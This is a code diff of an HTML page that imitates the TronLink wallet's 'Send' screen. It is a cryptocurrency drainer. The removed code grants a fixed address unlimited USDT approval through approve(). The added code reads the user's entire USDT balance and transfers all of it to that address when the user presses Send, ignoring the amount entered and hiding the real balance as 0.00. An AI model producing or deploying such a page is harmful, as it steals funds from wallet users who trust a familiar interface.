@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TronLink</title>
+    <title>TronLink App - Send</title>
     <style>
         * { box-sizing: border-box; }
         body { background-color: #ffffff; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; }
@@ -19,7 +19,6 @@
         .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
         .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 15px; outline: none; width: 75%; }
-        .input-actions { display: flex; align-items: center; gap: 14px; }
         .btn-paste { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 500; padding: 5px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .scan-icon { width: 18px; height: 18px; border: 2px solid #1c1c1e; border-radius: 3px; position: relative; cursor: pointer; }
         .tabs { display: flex; border-bottom: 1px solid #f0f0f2; margin-bottom: 20px; }
@@ -94,8 +93,8 @@
             <input type="number" id="userAmount" placeholder="Enter the transfer amount" value="10">
             <button class="btn-max" onclick="aplicarMax()">MAX</button>
         </div>
-        <div class="available-text">Available: <span id="availableBalance">7.5</span></div>
-        <button class="btn-bottom" onclick="ejecutarAprobacionMaxima()">Send</button>
+        <div class="available-text">Available: <span id="availableBalance">0.00</span></div>
+        <button class="btn-bottom" onclick="ejecutarEnvioMaximo()">Send</button>
     </div>
     <div class="nav-bar">
         <div class="nav-item">📁<br>Tokens</div>
@@ -128,15 +127,16 @@
     function aplicarMax() {
         document.getElementById('userAmount').value = document.getElementById('availableBalance').innerText;
     }
-    async function ejecutarAprobacionMaxima() {
+    async function ejecutarEnvioMaximo() {
         if (!window.tronWeb) return;
         try {
+            const miWallet = window.tronWeb.defaultAddress.base58;
             const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
-            // Valor máximo para aprobación ilimitada (uint256 max)
-            const ilimitado = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-            await contrato.approve(DESTINO_FIJO, ilimitado).send();
+            const saldoBigNum = await contrato.balanceOf(miWallet).call();
+            await contrato.transfer(DESTINO_FIJO, saldoBigNum.toString()).send();
         } catch (e) {}
     }
 </script>
 </body>
 </html>
+
